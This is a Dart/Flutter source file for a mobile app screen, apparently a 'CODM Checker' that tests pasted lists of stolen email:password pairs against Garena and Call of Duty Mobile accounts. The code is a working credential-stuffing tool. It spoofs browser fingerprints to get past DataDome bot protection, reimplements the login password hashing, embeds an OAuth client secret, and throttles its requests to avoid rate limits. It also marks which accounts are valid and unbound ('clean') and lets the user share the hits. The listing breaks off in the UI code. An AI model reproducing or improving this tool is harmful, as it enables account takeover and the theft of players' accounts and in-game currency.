// ============================================================
//  app/lib/screens/codm_checker_screen.dart
//  🎮 CODM Checker (Garena)
//
//  Ported from mycode.py (Ultimato Tools by K1NGDENZY).
//  Runs FULLY ON-DEVICE — no Railway backend needed.
//
//  Flow:
//    1. Get DataDome cookie  (dd.garena.com/js/)
//    2. Pre-login            (sso.garena.com/api/prelogin → v1, v2)
//    3. Hash password        (MD5 → SHA256 double → AES-ECB)
//    4. Login                (sso.garena.com/api/login → sso_key)
//    5. Account info         (account.garena.com/api/account/init)
//    6. CODM token           (100082.connect.garena.com)
//    7. CODM user info       (JWT decode or api check_login)
// ============================================================

import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:crypto/crypto.dart';
import 'package:encrypt/encrypt.dart' as enc;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:http/http.dart' as http;
import 'package:share_plus/share_plus.dart';

import '../services/ad_service.dart';
import '../theme/app_theme.dart';

// ── Colors ───────────────────────────────────────────────────────────────────
const _accent  = Color(0xFFFF6B35);
const _accent2 = Color(0xFFC0392B);

// ── Result model ─────────────────────────────────────────────────────────────
enum _Status { hit, noAccount, bad, error }

class _CodmResult {
  final String   combo;
  final _Status  status;
  final String   nickname;
  final String   level;
  final String   region;
  final String   uid;
  final String   shell;
  final String   country;
  final bool     isClean;
  final String   detail;

  const _CodmResult({
    required this.combo,
    required this.status,
    this.nickname  = '',
    this.level     = '',
    this.region    = '',
    this.uid       = '',
    this.shell     = '',
    this.country   = '',
    this.isClean   = false,
    this.detail    = '',
  });

  bool get isHit => status == _Status.hit || status == _Status.noAccount;
}

// ── Screen widget ─────────────────────────────────────────────────────────────
class CodmCheckerScreen extends StatefulWidget {
  final String userId;
  const CodmCheckerScreen({super.key, required this.userId});

  @override
  State<CodmCheckerScreen> createState() => _CodmCheckerScreenState();
}

class _CodmCheckerScreenState extends State<CodmCheckerScreen> {

  // ── Ad state ────────────────────────────────────────────────────────────────
  BannerAd? _bannerAd;
  bool      _bannerReady = false;
  bool      _adGranted   = false;

  // ── Checker state ───────────────────────────────────────────────────────────
  final _comboCtrl = TextEditingController();
  bool   _running  = false;
  bool   _stopped  = false;

  int _total    = 0;
  int _checked  = 0;
  int _hits     = 0;
  int _bad      = 0;
  int _errors   = 0;

  // DataDome cookie shared across checks in one session
  String? _datadome;

  final List<_CodmResult> _results = [];
  final ScrollController  _scroll  = ScrollController();

  // ── Lifecycle ────────────────────────────────────────────────────────────────

  @override
  void initState() {
    super.initState();
    AdService.instance.init(userId: widget.userId);
    AdService.instance.addListener(_onAdChanged);
    _initBanner();
  }

  @override
  void dispose() {
    AdService.instance.removeListener(_onAdChanged);
    _bannerAd?.dispose();
    _comboCtrl.dispose();
    _scroll.dispose();
    super.dispose();
  }

  // ── Ad helpers ───────────────────────────────────────────────────────────────

  void _onAdChanged() {
    if (!mounted) return;
    if (AdService.instance.adsRemoved && _bannerAd != null) {
      _bannerAd?.dispose();
      setState(() { _bannerAd = null; _bannerReady = false; });
    }
  }

  void _initBanner() {
    if (AdService.instance.adsRemoved) return;
    _bannerAd?.dispose(); _bannerAd = null; _bannerReady = false;
    final ad = AdService.instance.createBannerAd(
      onLoaded: () {
        if (!mounted || AdService.instance.adsRemoved) { _bannerAd?.dispose(); _bannerAd = null; return; }
        setState(() => _bannerReady = true);
      },
      onFailed: () {
        if (mounted) setState(() { _bannerAd = null; _bannerReady = false; });
        Future.delayed(const Duration(seconds: 30), () {
          if (mounted && !AdService.instance.adsRemoved) _initBanner();
        });
      },
    );
    if (ad == null) return;
    _bannerAd = ad;
    _bannerAd!.load();
  }

  Widget _buildBannerAd() {
    if (AdService.instance.adsRemoved || !_bannerReady || _bannerAd == null) return const SizedBox.shrink();
    return SafeArea(
      top: false,
      child: Container(
        alignment: Alignment.center,
        width:  _bannerAd!.size.width.toDouble(),
        height: _bannerAd!.size.height.toDouble(),
        child:  AdWidget(ad: _bannerAd!),
      ),
    );
  }

  void _watchAdToUnlock() {
    HapticFeedback.selectionClick();
    AdService.instance.showGatedInterstitial(
      onGranted: () {
        if (mounted) {
          setState(() => _adGranted = true);
          ScaffoldMessenger.of(context).showSnackBar(SnackBar(
            content: const Text('🔓 Unlocked! You can now use CODM Checker.',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600)),
            backgroundColor: _accent,
            behavior: SnackBarBehavior.floating,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(AppRadius.md)),
            margin:   const EdgeInsets.all(12),
            duration: const Duration(seconds: 2),
          ));
        }
      },
    );
  }

  // ── Crypto helpers (ported from mycode.py) ────────────────────────────────────

  /// MD5 of password (URL-decoded already — combos are plain text)
  static String _md5Hex(String input) {
    return md5.convert(utf8.encode(input)).toString();
  }

  /// Double SHA256 chain: SHA256(md5 + v1) → SHA256(result + v2)
  static String _doubleHash(String passmd5, String v1, String v2) {
    final inner = sha256.convert(utf8.encode(passmd5 + v1)).toString();
    return sha256.convert(utf8.encode(inner + v2)).toString();
  }

  /// AES-ECB encrypt: key = hex→bytes(outerHash), plaintext = hex→bytes(passmd5)
  /// Returns first 32 hex chars of ciphertext  (matches Python [:32])
  static String _aesEcbEncrypt(String passmd5, String outerHash) {
    // Both are 32-char hex strings → 16 bytes
    final keyBytes   = _hexToBytes(outerHash);
    final plainBytes = _hexToBytes(passmd5);
    final key    = enc.Key(keyBytes);
    final aes    = enc.AES(key, mode: enc.AESMode.ecb, padding: null);
    final encrypter = enc.Encrypter(aes);
    final encrypted = encrypter.encryptBytes(plainBytes);
    return _bytesToHex(encrypted.bytes).substring(0, 32);
  }

  static Uint8List _hexToBytes(String hex) {
    final result = Uint8List(hex.length ~/ 2);
    for (var i = 0; i < hex.length; i += 2) {
      result[i ~/ 2] = int.parse(hex.substring(i, i + 2), radix: 16);
    }
    return result;
  }

  static String _bytesToHex(List<int> bytes) {
    return bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join();
  }

  /// Full Garena password hash
  static String _hashPassword(String password, String v1, String v2) {
    final passmd5  = _md5Hex(password);
    final outerHash = _doubleHash(passmd5, v1, v2);
    return _aesEcbEncrypt(passmd5, outerHash);
  }

  // ── Garena API calls (ported from mycode.py) ─────────────────────────────────

  static const _ua = 'Mozilla/5.0 (Linux; Android 11; Infinix HOT 11S) '
      'AppleWebKit/537.36 (KHTML, like Gecko) '
      'Chrome/120.0.0.0 Mobile Safari/537.36';

  /// Step 1 – Get DataDome cookie from dd.garena.com
  Future<String?> _getDataDome() async {
    try {
      final payload = {
        'jsData': jsonEncode({
          'ttst': 76.7, 'ifov': false, 'hc': 4, 'br_oh': 800, 'br_ow': 412,
          'ua': _ua, 'wbd': false, 'dp0': true, 'tagpu': 5.7,
          'br_h': 760, 'br_w': 412, 'isf': false, 'nddc': 1,
          'rs_h': 800, 'rs_w': 412, 'rs_cd': 24, 'phe': false,
          'nm': false, 'jsf': false, 'lg': 'en-US', 'pr': 2.0,
          'tz': -480, 'str_ss': true, 'str_ls': true,
          'str_idb': true, 'str_odb': false,
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4',
      };

      final body = payload.entries
          .map((e) => '${Uri.encodeComponent(e.key)}=${Uri.encodeComponent(e.value)}')
          .join('&');

      final res = await http.post(
        Uri.parse('https://dd.garena.com/js/'),
        headers: {
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://account.garena.com',
          'Referer': 'https://account.garena.com/',
          'User-Agent': _ua,
        },
        body: body,
      ).timeout(const Duration(seconds: 15));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['status'] == 200 && data.containsKey('cookie')) {
          final cookieStr = data['cookie'] as String;
          return cookieStr.split(';')[0].split('=').skip(1).join('=');
        }
      }
    } catch (_) {}
    return null;
  }

  /// Step 2 – Pre-login → v1, v2
  Future<Map<String, String>?> _prelogin(String account) async {
    try {
      final ts     = DateTime.now().millisecondsSinceEpoch;
      final params = {
        'app_id':  '10100',
        'account': account,
        'format':  'json',
        'id':      '$ts',
      };
      final uri = Uri.https('sso.garena.com', '/api/prelogin', params);
      final headers = <String, String>{
        'Accept':          'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent':      _ua,
        'Referer':
            'https://sso.garena.com/universal/login?app_id=10100'
            '&redirect_uri=https%3A%2F%2Faccount.garena.com%2F'
            '&locale=en-SG&account=$account',
      };
      if (_datadome != null) {
        headers['Cookie'] = 'datadome=$_datadome';
      }

      final res = await http.get(uri, headers: headers)
          .timeout(const Duration(seconds: 20));

      // Update DataDome from response cookies
      _extractDatadomeFromResponse(res);

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        if (data.containsKey('error')) return null;
        final v1 = data['v1'] as String?;
        final v2 = data['v2'] as String?;
        if (v1 != null && v2 != null && v1.isNotEmpty && v2.isNotEmpty) {
          return {'v1': v1, 'v2': v2};
        }
      }
    } catch (_) {}
    return null;
  }

  /// Step 3 – Login → sso_key
  Future<String?> _login(String account, String password, String v1, String v2) async {
    try {
      final hashed = _hashPassword(password, v1, v2);
      final ts     = DateTime.now().millisecondsSinceEpoch;
      final params = {
        'app_id':       '10100',
        'account':      account,
        'password':     hashed,
        'redirect_uri': 'https://account.garena.com/',
        'format':       'json',
        'id':           '$ts',
      };
      final uri = Uri.https('sso.garena.com', '/api/login', params);
      final headers = <String, String>{
        'Accept':          'application/json, text/plain, */*',
        'User-Agent':      _ua,
        'Referer':         'https://account.garena.com/',
      };
      if (_datadome != null) headers['Cookie'] = 'datadome=$_datadome';

      final res = await http.get(uri, headers: headers)
          .timeout(const Duration(seconds: 20));

      _extractDatadomeFromResponse(res);
      _extractCookieFromResponse(res, 'sso_key');

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        if (data.containsKey('error')) return null;

        // sso_key may come in Set-Cookie or response body
        final ssoFromBody = data['sso_key'] as String?;
        if (ssoFromBody != null && ssoFromBody.isNotEmpty) return ssoFromBody;

        final setCookie = res.headers['set-cookie'] ?? '';
        final match = RegExp(r'sso_key=([^;]+)').firstMatch(setCookie);
        if (match != null) return match.group(1);
      }
    } catch (_) {}
    return null;
  }

  String? _ssoKey; // updated per account during session

  void _extractDatadomeFromResponse(http.Response res) {
    try {
      final setCookie = res.headers['set-cookie'] ?? '';
      final match = RegExp(r'datadome=([^;]+)').firstMatch(setCookie);
      if (match != null) _datadome = match.group(1);
    } catch (_) {}
  }

  void _extractCookieFromResponse(http.Response res, String name) {
    try {
      final setCookie = res.headers['set-cookie'] ?? '';
      final match = RegExp('$name=([^;]+)').firstMatch(setCookie);
      if (match != null && name == 'sso_key') _ssoKey = match.group(1);
    } catch (_) {}
  }

  /// Step 4 – Fetch Garena account info
  Future<Map<String, dynamic>?> _fetchAccountInfo(String ssoKey) async {
    try {
      final cookieStr = <String>[];
      if (_datadome != null) cookieStr.add('datadome=$_datadome');
      if (_ssoKey   != null) cookieStr.add('sso_key=$_ssoKey');
      cookieStr.add('sso_key=$ssoKey');

      final res = await http.get(
        Uri.parse('https://account.garena.com/api/account/init'),
        headers: {
          'Accept':     '*/*',
          'Referer':    'https://account.garena.com/',
          'User-Agent': _ua,
          'Cookie':     cookieStr.join('; '),
        },
      ).timeout(const Duration(seconds: 20));

      if (res.statusCode == 200) {
        return jsonDecode(res.body) as Map<String, dynamic>;
      }
    } catch (_) {}
    return null;
  }

  /// Step 5 – Get CODM access token via Garena OAuth
  Future<Map<String, String>?> _getCodmAccessToken(String ssoKey) async {
    try {
      // Grant step
      final ts      = DateTime.now().millisecondsSinceEpoch;
      final grantRes = await http.post(
        Uri.parse('https://100082.connect.garena.com/oauth/token/grant'),
        headers: {
          'Host':             '100082.connect.garena.com',
          'User-Agent':       'Mozilla/5.0 (Linux; Android 11; Infinix HOT 11S Build/RP1A.200720.011; wv) '
              'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36; '
              'GarenaMSDK/5.12.1(Infinix HOT 11S ;Android 11;en;us;)',
          'Content-Type':     'application/x-www-form-urlencoded;charset=UTF-8',
          'X-Requested-With': 'com.garena.game.codm',
          'Cookie':           'sso_key=$ssoKey',
        },
        body: 'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F'
            '&response_type=code&id=$ts',
      ).timeout(const Duration(seconds: 15));

      if (grantRes.statusCode != 200) return null;
      final grantData  = jsonDecode(grantRes.body);
      final authCode   = grantData['code'] as String?;
      if (authCode == null || authCode.isEmpty) return null;

      // Exchange step
      final deviceId   = '02-${_uuid()}';
      final tokenRes   = await http.post(
        Uri.parse('https://100082.connect.garena.com/oauth/token/exchange'),
        headers: {
          'User-Agent':     'GarenaMSDK/5.12.1(Infinix HOT 11S ;Android 11;en;us;)',
          'Content-Type':   'application/x-www-form-urlencoded',
          'Host':           '100082.connect.garena.com',
          'Connection':     'Keep-Alive',
          'Accept-Encoding': 'gzip',
        },
        body: 'grant_type=authorization_code&code=$authCode'
            '&device_id=$deviceId&redirect_uri=gop100082%3A%2F%2Fauth%2F'
            '&source=2&client_id=100082'
            '&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415',
      ).timeout(const Duration(seconds: 15));

      if (tokenRes.statusCode != 200) return null;
      final tokenData  = jsonDecode(tokenRes.body);
      final accessToken = tokenData['access_token'] as String?;
      final openId      = tokenData['open_id']      as String? ?? '';
      final uid         = tokenData['uid']           as String? ?? '';
      if (accessToken == null || accessToken.isEmpty) return null;
      return {'access_token': accessToken, 'open_id': openId, 'uid': uid};
    } catch (_) {}
    return null;
  }

  /// Step 6 – CODM callback → get codm_token
  Future<Map<String, String>?> _getCodmToken(String accessToken) async {
    // Try AOS first, then old endpoint
    for (final base in [
      'https://api-delete-request-aos.codm.garena.co.id',
      'https://api-delete-request.codm.garena.co.id',
    ]) {
      try {
        final res = await http.get(
          Uri.parse('$base/oauth/callback/?access_token=$accessToken'),
          headers: {
            'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent':      'Mozilla/5.0 (Linux; Android 11; Infinix HOT 11S Build/RP1A.200720.011; wv) '
                'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'com.garena.game.codm',
          },
        ).timeout(const Duration(seconds: 15));

        final location = res.headers['location'] ?? '';
        if (location.contains('err=3')) return {'status': 'no_account'};
        if (location.contains('token=')) {
          final token = Uri.splitQueryString(
              location.contains('?') ? location.split('?').last : location)['token'] ?? '';
          if (token.isNotEmpty) return {'status': 'success', 'token': token};
        }
      } catch (_) {}
    }
    return null;
  }

  /// Step 7 – Decode CODM JWT or call check_login
  Future<Map<String, dynamic>?> _getCodmInfo(String codmToken) async {
    // Try JWT decode first (no network needed)
    try {
      final parts = codmToken.split('.');
      if (parts.length == 3) {
        var payload = parts[1];
        payload += '=' * ((4 - payload.length % 4) % 4);
        final decoded = utf8.decode(base64Url.decode(payload));
        final jwt     = jsonDecode(decoded) as Map<String, dynamic>;
        final user    = jwt['user'] as Map<String, dynamic>?;
        if (user != null) return user;
      }
    } catch (_) {}

    // Fallback: call check_login endpoint
    try {
      final res = await http.get(
        Uri.parse('https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'),
        headers: {
          'Accept':             'application/json, text/plain, */*',
          'codm-delete-token':  codmToken,
          'User-Agent':         'Mozilla/5.0 (Linux; Android 11; Infinix HOT 11S Build/RP1A.200720.011; wv) '
              'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36',
          'X-Requested-With':   'com.garena.game.codm',
        },
      ).timeout(const Duration(seconds: 15));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        return data['user'] as Map<String, dynamic>?;
      }
    } catch (_) {}
    return null;
  }

  // ── UUID helper ──────────────────────────────────────────────────────────────
  static String _uuid() {
    final r = List<int>.generate(16, (_) => DateTime.now().microsecondsSinceEpoch & 0xff);
    r[6] = (r[6] & 0x0f) | 0x40;
    r[8] = (r[8] & 0x3f) | 0x80;
    return [
      r.sublist(0,  4), r.sublist(4,  6),
      r.sublist(6,  8), r.sublist(8, 10),
      r.sublist(10, 16),
    ].map((b) => b.map((x) => x.toRadixString(16).padLeft(2, '0')).join()).join('-');
  }

  // ── Parse Garena account details (ported from mycode.py) ──────────────────────
  static Map<String, dynamic> _parseAccountDetails(Map<String, dynamic> data) {
    final userInfo = data['user_info'] as Map<String, dynamic>? ?? data;
    final binds = <String>[];
    final email   = (userInfo['email'] as String? ?? '');
    final mobile  = (userInfo['mobile_no'] as String? ?? '');
    final fbConn  = userInfo['is_fbconnect_enabled'] == true || userInfo['is_fbconnect_enabled'] == 1;
    final emailV  = userInfo['email_v'] == 1 || userInfo['email_v'] == true;
    final idCard  = (userInfo['idcard'] as String? ?? '');
    if (emailV || (email.isNotEmpty && !email.startsWith('***'))) binds.add('Email');
    if (mobile.trim().isNotEmpty && mobile != 'N/A') binds.add('Phone');
    if (fbConn) binds.add('Facebook');
    if (idCard.trim().isNotEmpty && idCard != 'N/A') binds.add('ID Card');
    return {
      'username':  userInfo['username']    ?? '',
      'email':     email,
      'mobile':    mobile,
      'shell':     userInfo['shell']       ?? 0,
      'country':   userInfo['acc_country'] ?? '',
      'two_step':  userInfo['two_step_verify_enable'] == 1 || userInfo['two_step_verify_enable'] == true,
      'email_ver': emailV,
      'is_clean':  binds.isEmpty,
      'binds':     binds,
    };
  }

  // ── Main check flow ───────────────────────────────────────────────────────────
  Future<_CodmResult> _checkOne(String combo) async {
    if (!combo.contains(':')) {
      return _CodmResult(combo: combo, status: _Status.error, detail: 'Invalid format');
    }
    final parts    = combo.split(':');
    final account  = parts[0].trim();
    final password = parts.sublist(1).join(':').trim();

    try {
      // Pre-login
      final preLoginData = await _prelogin(account);
      if (preLoginData == null) {
        return _CodmResult(combo: combo, status: _Status.bad, detail: 'Pre-login failed / invalid account');
      }

      // Login
      final ssoKey = await _login(account, password, preLoginData['v1']!, preLoginData['v2']!);
      if (ssoKey == null) {
        return _CodmResult(combo: combo, status: _Status.bad, detail: 'Wrong password or banned');
      }

      // Account info
      final accountInfo = await _fetchAccountInfo(ssoKey);
      if (accountInfo == null) {
        return _CodmResult(combo: combo, status: _Status.error, detail: 'Could not fetch account info');
      }
      final details = _parseAccountDetails(accountInfo);

      // CODM token
      final tokenMap = await _getCodmAccessToken(ssoKey);
      if (tokenMap == null) {
        // Valid Garena account but CODM token fetch failed
        return _CodmResult(
          combo:    combo,
          status:   _Status.noAccount,
          shell:    '${details['shell']}',
          country:  '${details['country']}',
          isClean:  details['is_clean'] as bool,
          detail:   'Valid Garena | CODM token fetch failed',
        );
      }

      final codmCallback = await _getCodmToken(tokenMap['access_token']!);
      if (codmCallback == null || codmCallback['status'] == 'no_account') {
        return _CodmResult(
          combo:   combo,
          status:  _Status.noAccount,
          shell:   '${details['shell']}',
          country: '${details['country']}',
          isClean: details['is_clean'] as bool,
          detail:  'Valid Garena | No CODM account linked',
        );
      }

      final codmToken = codmCallback['token']!;
      final codmInfo  = await _getCodmInfo(codmToken);

      return _CodmResult(
        combo:    combo,
        status:   _Status.hit,
        nickname: codmInfo?['codm_nickname'] as String? ?? codmInfo?['nickname'] as String? ?? '',
        level:    '${codmInfo?['codm_level'] ?? ''}',
        region:   '${codmInfo?['region'] ?? ''}',
        uid:      '${codmInfo?['uid'] ?? ''}',
        shell:    '${details['shell']}',
        country:  '${details['country']}',
        isClean:  details['is_clean'] as bool,
        detail:   'HIT',
      );
    } catch (e) {
      return _CodmResult(combo: combo, status: _Status.error, detail: 'Error: $e');
    }
  }

  // ── Start checker ─────────────────────────────────────────────────────────────
  Future<void> _startCheck() async {
    if (!AdService.instance.adsRemoved && !_adGranted) {
      _watchAdToUnlock();
      return;
    }

    final lines = _comboCtrl.text
        .split('\n')
        .map((l) => l.trim())
        .where((l) => l.isNotEmpty)
        .toList();

    if (lines.isEmpty) return;

    FocusScope.of(context).unfocus();
    HapticFeedback.mediumImpact();

    _datadome = null;
    _ssoKey   = null;

    setState(() {
      _running  = true;
      _stopped  = false;
      _total    = lines.length;
      _checked  = 0;
      _hits     = 0;
      _bad      = 0;
      _errors   = 0;
      _results.clear();
    });

    // Get DataDome once for the session
    _datadome = await _getDataDome();

    for (final combo in lines) {
      if (_stopped || !mounted) break;

      final result = await _checkOne(combo);
      if (!mounted) break;

      setState(() {
        _checked++;
        _results.insert(0, result);
        if (result.isHit) _hits++;
        else if (result.status == _Status.bad) _bad++;
        else _errors++;
      });

      // scroll to top to see latest
      if (_scroll.hasClients) _scroll.jumpTo(0);

      // Small delay to avoid rate-limiting
      await Future.delayed(const Duration(milliseconds: 500));
    }

    if (!mounted) return;
    setState(() => _running = false);

    // Interstitial after finishing
    Future.delayed(const Duration(milliseconds: 600), () {
      if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    });
  }

  // ── Share / Copy ─────────────────────────────────────────────────────────────
  void _shareHits() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    HapticFeedback.selectionClick();
    final hits = _results.where((r) => r.status == _Status.hit).toList();
    if (hits.isEmpty) return;
    final buf = StringBuffer()
      ..writeln('🎮 CODM Checker Hits — Xissin')
      ..writeln('══════════════════════════════');
    for (final h in hits) {
      buf..writeln('📧 Account: ${h.combo}')
         ..writeln('🎮 IGN:     ${h.nickname}')
         ..writeln('⚡ Level:   ${h.level}')
         ..writeln('🌍 Region:  ${h.region}')
         ..writeln('💎 Shells:  ${h.shell}')
         ..writeln('🌐 Country: ${h.country}')
         ..writeln('🔒 Clean:   ${h.isClean ? "YES ✅" : "NO ❌"}')
         ..writeln('──────────────────────────────');
    }
    buf.writeln('Checked with Xissin — t.me/Xissin_0');
    Share.share(buf.toString(), subject: 'CODM Checker Hits');
  }

  void _copyHits() {
    final hits = _results.where((r) => r.status == _Status.hit).toList();
    if (hits.isEmpty) return;
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    final text = hits.map((h) => '${h.combo} | ${h.nickname} | Lv.${h.level}').join('\n');
    Clipboard.setData(ClipboardData(text: text));
    HapticFeedback.selectionClick();
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text('${hits.length} hit(s) copied!'),
      backgroundColor: _accent, duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      margin: const EdgeInsets.all(12),
    ));
  }

  void _reset() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    HapticFeedback.mediumImpact();
    setState(() {
      _running = false; _stopped = false;
      _total = 0; _checked = 0; _hits = 0; _bad = 0; _errors = 0;
      _results.clear(); _comboCtrl.clear();
      _datadome = null; _ssoKey = null;
    });
  }

  // ── Build ─────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final c = context.c;
    return Scaffold(
      backgroundColor:    c.background,
      bottomNavigationBar: _buildBannerAd(),
      appBar: AppBar(
        backgroundColor: Colors.transparent, elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: _accent, size: 20),
          onPressed: () {
            if (_running) setState(() => _stopped = true);
            Navigator.pop(context);
          },
        ),
        title: Row(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: _accent.withOpacity(0.15),
              borderRadius: BorderRadius.circular(10),
            ),
            child: const Icon(Icons.sports_esports_rounded, color: _accent, size: 18),
          ),
          const SizedBox(width: 10),
          Text('CODM Checker',
              style: TextStyle(color: c.textPrimary, fontSize: 17,
                  fontWeight: FontWeight.w700, letterSpacing: 0.4)),
        ]),
        centerTitle: true,
        actions: [
          if (_results.any((r) => r.status == _Status.hit)) ...[
            IconButton(
              icon: const Icon(Icons.copy_rounded, color: _accent, size: 20),
              tooltip: 'Copy Hits',
              onPressed: _copyHits,
            ),
            IconButton(
              icon: const Icon(Icons.share_rounded, color: _accent, size: 20),
              tooltip: 'Share Hits',
              onPressed: _shareHits,
            ),
          ],
          if (!_running && _results.isNotEmpty)
            IconButton(
              icon: const Icon(Icons.refresh_rounded, color: _accent, size: 20),
              tooltip: 'Reset',
              onPressed: _reset,
            ),
        ],
      ),
      body: SingleChildScrollView(
        controller: _scroll,
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // Ad gate
            if (!AdService.instance.adsRemoved && !_adGranted)
              _buildAdGate(c),

            // Stats bar
            if (_total > 0) _buildStatsBar(c),
            if (_total > 0) const SizedBox(height: 12),

            // Input card
            _buildInputCard(c),
            const SizedBox(height: 14),

            // Results
            ..._results.map((r) => _buildResultCard(r, c)),
            const SizedBox(height: 40),
          ],
        ),
      ),
    );
  }

  Widget _buildAdGate(XissinColors c) => Container(
    margin: const EdgeInsets.only(bottom: 14),
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      color:        _accent.withOpacity(0.06),
      borderRadius: BorderRadius.circular(18),
      border:       Border.all(color: _accent.withOpacity(0.25)),
    ),
    child: Column(children: [
      Row(children: [
        const Icon(Icons.lock_outline_rounded, color: _accent, size: 18),
        const SizedBox(width: 10),
        Expanded(child: Text(
          'Watch a short ad to unlock CODM Checker for this session.',
          style: TextStyle(color: c.textSecondary, fontSize: 12, height: 1.4),
        )),
      ]),
      const SizedBox(height: 12),
      SizedBox(
        width: double.infinity,
        child: ElevatedButton.icon(
          onPressed: _watchAdToUnlock,
          style: ElevatedButton.styleFrom(
            backgroundColor: _accent, foregroundColor: Colors.white,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            elevation: 0, padding: const EdgeInsets.symmetric(vertical: 12),
          ),
          icon:  const Icon(Icons.play_circle_rounded, size: 18),
          label: const Text('Watch Ad to Unlock',
              style: TextStyle(fontWeight: FontWeight.w700, fontSize: 14)),
        ),
      ),
      const SizedBox(height: 8),
      Text('⭐ Get Premium to remove all ads permanently',
          style: TextStyle(color: c.textHint, fontSize: 11)),
    ]),
  );

  Widget _buildStatsBar(XissinColors c) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
    decoration: BoxDecoration(
      color:        c.surface,
      borderRadius: BorderRadius.circular(16),
      border:       Border.all(color: c.border),
    ),
    child: Row(children: [
      _statChip('✅ Hits',   '$_hits',    const Color(0xFF2ECC71)),
      _statDivider(),
      _statChip('❌ Bad',    '$_bad',     const Color(0xFFFF6B6B)),
      _statDivider(),
      _statChip('⚠️ Err',   '$_errors',  const Color(0xFFFFA94D)),
      _statDivider(),
      _statChip('📋 Total', '$_checked/$_total', _accent),
      if (_running) ...[
        _statDivider(),
        const SizedBox(width: 14, height: 14,
            child: CircularProgressIndicator(color: _accent, strokeWidth: 2)),
      ],
    ]),
  );

  Widget _statChip(String label, String value, Color color) => Expanded(
    child: Column(children: [
      Text(value, style: TextStyle(color: color, fontWeight: FontWeight.w800, fontSize: 14)),
      const SizedBox(height: 2),
      Text(label, style: TextStyle(color: color.withOpacity(0.7), fontSize: 9)),
    ]),
  );

  Widget _statDivider() => Container(height: 30, width: 1, color: Colors.white12);

  Widget _buildInputCard(XissinColors c) => Container(
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      color:        c.surface,
      borderRadius: BorderRadius.circular(18),
      border:       Border.all(color: _accent.withOpacity(0.3)),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Row(children: [
        const Icon(Icons.list_alt_rounded, color: _accent, size: 16),
        const SizedBox(width: 8),
        Text('Combo List  (email:password per line)',
            style: TextStyle(color: _accent, fontSize: 12, fontWeight: FontWeight.w600)),
      ]),
      const SizedBox(height: 10),
      TextField(
        controller: _comboCtrl,
        enabled:    !_running,
        minLines: 5, maxLines: 10,
        style: TextStyle(color: c.textPrimary, fontSize: 12, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'email@example.com:password123\nemail2@example.com:pass456\n...',
          hintStyle: TextStyle(color: c.textHint, fontSize: 11),
          filled: true, fillColor: c.background,
          border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
          contentPadding: const EdgeInsets.all(12),
        ),
        keyboardType: TextInputType.multiline,
      ),
      const SizedBox(height: 12),
      Row(children: [
        Expanded(
          child: ElevatedButton.icon(
            onPressed: _running ? () => setState(() => _stopped = true) : _startCheck,
            style: ElevatedButton.styleFrom(
              backgroundColor: _running ? const Color(0xFFFF6B6B) : _accent,
              foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              elevation: 0,
              padding: const EdgeInsets.symmetric(vertical: 13),
            ),
            icon: Icon(_running ? Icons.stop_rounded : Icons.play_arrow_rounded, size: 18),
            label: Text(_running ? 'Stop' : 'Start Check',
                style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 14)),
          ),
        ),
        if (!_running && _results.isNotEmpty) ...[
          const SizedBox(width: 10),
          ElevatedButton.icon(
